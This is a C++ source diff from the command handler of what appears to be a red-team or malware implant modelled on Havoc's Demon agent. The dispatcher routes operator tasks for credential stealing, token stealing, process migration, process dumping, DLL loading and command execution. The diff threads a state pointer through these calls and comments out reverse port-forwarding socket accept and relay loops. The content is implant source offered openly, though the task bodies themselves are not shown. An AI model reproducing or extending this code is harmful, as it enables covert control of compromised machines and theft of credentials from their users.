@@ -173,22 +173,23 @@ namespace Handler
         switch(commandCode)
         {
             case TASK_CAT:
-                wTaskResult = Task::Cat(Utils::Convert::UTF8Decode(args["path"]));
+                wTaskResult = Task::Cat(pState, Utils::Convert::UTF8Decode(args["path"]));
                 break;
             case TASK_CD:
-                wTaskResult = Task::Cd(Utils::Convert::UTF8Decode(args["path"]));
+                wTaskResult = Task::Cd(pState, Utils::Convert::UTF8Decode(args["path"]));
                 break;
             case TASK_CONNECT:
                 wTaskResult = Task::Connect(pState, Utils::Convert::UTF8Decode(args["url"]));
                 break;
             case TASK_CP:
                 wTaskResult = Task::Cp(
+                    pState,
                     Utils::Convert::UTF8Decode(args["src"]),
                     Utils::Convert::UTF8Decode(args["dest"])
                 );
                 break;
             case TASK_CREDS_STEAL:
-                wTaskResult = Task::CredsSteal();
+                wTaskResult = Task::CredsSteal(pState);
                 break;
             case TASK_DLL:
                 wTaskResult = Task::Dll(
@@ -205,16 +206,16 @@ namespace Handler
                 );
                 break;
             case TASK_ENV_LS:
-                wTaskResult = Task::EnvLs();
+                wTaskResult = Task::EnvLs(pState);
                 break;
             case TASK_EXECUTE:
-                wTaskResult = Task::Execute(Utils::Convert::UTF8Decode(args["cmd"]));
+                wTaskResult = Task::Execute(pState, Utils::Convert::UTF8Decode(args["cmd"]));
                 break;
             case TASK_GROUP_LS:
                 wTaskResult = Task::GroupLs();
                 break;
             case TASK_HISTORY:
-                wTaskResult = Task::History();
+                wTaskResult = Task::History(pState);
                 break;
             case TASK_IP:
                 wTaskResult = Task::Ip();
@@ -232,13 +233,13 @@ namespace Handler
                 wTaskResult = Task::KillDateSet(pState, Utils::Convert::UTF8Decode(args["datetime"]));
                 break;
             case TASK_LS:
-                wTaskResult = Task::Ls(Utils::Convert::UTF8Decode(args["path"]));
+                wTaskResult = Task::Ls(pState, Utils::Convert::UTF8Decode(args["path"]));
                 break;
             case TASK_MIGRATE:
-                wTaskResult = Task::Migrate(Utils::Convert::UTF8Decode(args["pid"]));
+                wTaskResult = Task::Migrate(pState, Utils::Convert::UTF8Decode(args["pid"]));
                 break;
             case TASK_MKDIR:
-                wTaskResult = Task::Mkdir(Utils::Convert::UTF8Decode(args["path"]));
+                wTaskResult = Task::Mkdir(pState, Utils::Convert::UTF8Decode(args["path"]));
                 break;
             case TASK_MV:
                 wTaskResult = Task::Mv(
@@ -253,10 +254,10 @@ namespace Handler
                 wTaskResult = Task::Procdump(pState, Utils::Convert::UTF8Decode(args["pid"]));
                 break;
             case TASK_PS_KILL:
-                wTaskResult = Task::PsKill(Utils::Convert::UTF8Decode(args["pid"]));
+                wTaskResult = Task::PsKill(pState->pProcs, Utils::Convert::UTF8Decode(args["pid"]));
                 break;
             case TASK_PS_LS:
-                wTaskResult = Task::Ps();
+                wTaskResult = Task::PsLs(pState->pProcs);
                 break;
             case TASK_PWD:
                 wTaskResult = Task::Pwd();
@@ -330,6 +331,7 @@ namespace Handler
                 break;
             case TASK_TOKEN_STEAL:
                 wTaskResult = Task::TokenSteal(
+                    pState,
                     Utils::Convert::UTF8Decode(args["pid"]),
                     Utils::Convert::UTF8Decode(args["process"]),
                     Utils::Convert::UTF8Decode(args["login"]) == L"true"
@@ -412,114 +414,114 @@ namespace Handler
         return FALSE;
     }
 
-    BOOL SocketAccept(State::PSTATE pState)
-    {
-        Socket::PSOCKET_DATA pSocket = NULL;
-        Socket::PSOCKET_DATA pClientSocket  = NULL;
-        SOCKET clientSocket = 0;
-        u_long ulIOBlock = 1;
+    // BOOL SocketAccept(State::PSTATE pState)
+    // {
+    //     Socket::PSOCKET_DATA pSocket = NULL;
+    //     Socket::PSOCKET_DATA pClientSocket  = NULL;
+    //     SOCKET clientSocket = 0;
+    //     u_long ulIOBlock = 1;
 
-        pSocket = pState->pSocket;
+    //     pSocket = pState->pSocket;
         
-        while (true)
-        {
-            if (!pSocket)
-                break;
+    //     while (true)
+    //     {
+    //         if (!pSocket)
+    //             break;
 
-            if (pSocket->bShouldRemove)
-            {
-                pSocket = pSocket->next;
-                continue;
-            }
+    //         if (pSocket->bShouldRemove)
+    //         {
+    //             pSocket = pSocket->next;
+    //             continue;
+    //         }
 
-            // Accept connections
-            if (pSocket->dwType == SOCKET_TYPE_REVERSE_PORT_FORWARDING)
-            {
-                clientSocket = accept(pSocket->socket, NULL, NULL);
-                if (clientSocket != INVALID_SOCKET)
-                {
-                    if (ioctlsocket(clientSocket, FIONBIO, &ulIOBlock) != SOCKET_ERROR)
-                    {
-                        pClientSocket = Socket::NewSocket(
-                            SOCKET_TYPE_CLIENT,
-                            pSocket->dwLIP,
-                            pSocket->dwLPort,
-                            pSocket->dwFwdIP,
-                            pSocket->dwFwdPort,
-                            pSocket->dwID
-                        );
-                        if (!pClientSocket)
-                        {
-                            continue;
-                        }
+    //         // Accept connections
+    //         if (pSocket->dwType == SOCKET_TYPE_REVERSE_PORT_FORWARDING)
+    //         {
+    //             clientSocket = accept(pSocket->socket, NULL, NULL);
+    //             if (clientSocket != INVALID_SOCKET)
+    //             {
+    //                 if (ioctlsocket(clientSocket, FIONBIO, &ulIOBlock) != SOCKET_ERROR)
+    //                 {
+    //                     pClientSocket = Socket::NewSocket(
+    //                         SOCKET_TYPE_CLIENT,
+    //                         pSocket->dwLIP,
+    //                         pSocket->dwLPort,
+    //                         pSocket->dwFwdIP,
+    //                         pSocket->dwFwdPort,
+    //                         pSocket->dwID
+    //                     );
+    //                     if (!pClientSocket)
+    //                     {
+    //                         continue;
+    //                     }
 
-                        // Send the socket open request.
-                        // System::Http::SendRequest(
-                        //     pState->hConnect,
-                        //     pState->lpListenerHost,
-                        //     pState->nListenerPort,
-                        //     ...
-                        // )
-                    }
-                }
-            }
+    //                     // Send the socket open request.
+    //                     // System::Http::SendRequest(
+    //                     //     pState->hConnect,
+    //                     //     pState->lpListenerHost,
+    //                     //     pState->nListenerPort,
+    //                     //     ...
+    //                     // )
+    //                 }
+    //             }
+    //         }
 
-            pSocket = pSocket->next;
-        }
+    //         pSocket = pSocket->next;
+    //     }
 
-        return TRUE;
-    }
+    //     return TRUE;
+    // }
 
     // Reference:
     // https://github.com/HavocFramework/Havoc/blob/ea3646e055eb1612dcc956130fd632029dbf0b86/payloads/Demon/src/core/Socket.c#L281
-    BOOL SocketRead(State::PSTATE pState)
-    {
-        Socket::PSOCKET_DATA pSocket = NULL;
-        PVOID newBuf = NULL;
-        char recvBuf[512];
-        int recvBufLen = 512;
-        BOOL bResult = FALSE;
-        int iResult, iSendResult;
+    // BOOL SocketRead(State::PSTATE pState)
+    // {
+    //     Socket::PSOCKET_DATA pSocket = NULL;
+    //     PVOID newBuf = NULL;
+    //     char recvBuf[512];
+    //     int recvBufLen = 512;
+    //     BOOL bResult = FALSE;
+    //     int iResult, iSendResult;
 
-        pSocket = pState->pSocket;
+    //     pSocket = pState->pSocket;
 
-        while (true)
-        {
-            if (!pSocket)
-                break;
+    //     while (true)
+    //     {
+    //         if (!pSocket)
+    //             break;
 
-            if (pSocket->bShouldRemove)
-            {
-                pSocket = pSocket->next;
-                continue;
-            }
+    //         if (pSocket->bShouldRemove)
+    //         {
+    //             pSocket = pSocket->next;
+    //             continue;
+    //         }
 
-            if (pSocket->dwType == SOCKET_TYPE_CLIENT)
-            {
-                // Read data from connected clients.
-                do
-                {
-                    iResult = recv(pSocket->socket, recvBuf, recvBufLen, 0);
-                    if (iResult > 0)
-                    {
-                        // Data received
-                        // ...
+    //         if (pSocket->dwType == SOCKET_TYPE_CLIENT)
+    //         {
+    //             // Read data from connected clients.
+    //             do
+    //             {
+    //                 iResult = recv(pSocket->socket, recvBuf, recvBufLen, 0);
+    //                 if (iResult > 0)
+    //                 {
+    //                     // Data received
+    //                     // ...
 
                         
-                        // Send data to connected clients
-                        iSendResult = send(pSocket->socket, recvBuf, iResult, 0);
-                        if (iSendResult == SOCKET_ERROR)
-                        {
-                        }
-                    }
-                } while (iResult > 0);
-            }
+    //                     // Send data to connected clients
+    //                     iSendResult = send(pSocket->socket, recvBuf, iResult, 0);
+    //                     if (iSendResult == SOCKET_ERROR)
+    //                     {
+    //                     }
+    //                 }
+    //             } while (iResult > 0);
+    //         }
 
-            pSocket = pSocket->next;
-        }
+    //         pSocket = pSocket->next;
+    //     }
 
-        return TRUE;
-    }
+    //     return TRUE;
+    // }
 
     //
     // BOOL SocketClose(State::PSTATE pState)
@@ -533,14 +535,14 @@ namespace Handler
 
     // }
 
-    BOOL Socket(State::PSTATE pState)
-    {
-        SocketAccept(pState);
-        // SocketRead(pState);
-        // SocketKill(pState);
+    // BOOL Socket(State::PSTATE pState)
+    // {
+    //     SocketAccept(pState);
+    //     // SocketRead(pState);
+    //     // SocketKill(pState);
 
-        return TRUE;
-    }
+    //     return TRUE;
+    // }
 
     BOOL IsKillDateReached(INT nKillDate)
     {
